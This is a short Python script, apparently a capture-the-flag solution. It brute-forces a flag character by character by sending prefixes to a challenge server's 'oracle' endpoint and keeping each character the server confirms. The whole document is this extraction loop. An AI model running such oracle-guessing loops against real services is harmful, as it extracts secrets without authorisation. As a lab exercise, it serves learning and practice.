import requests
import string

url = "http://leak7.chal.deti:8016/oracle"
current_flag = "flag{"
charset = string.hexdigits.lower()[:16] + "}"

while not current_flag.endswith("}"):
    found = False

    for char in charset:
        candidate = current_flag + char

        try:
            r = requests.get(url, params={"prefix": candidate}, timeout=5)
        except requests.RequestException as e:
            print("Request error:", e)
            raise SystemExit

        print(f"Trying {candidate!r} -> {r.status_code}: {r.text!r}")

        if r.status_code == 200 and r.text.strip() == "yes":
            current_flag = candidate
            print("[+] Prefix now:", current_flag)
            found = True
            break

    if not found:
        print("No matching character. The oracle response needs investigation.")
        break

print("Result:", current_flag)
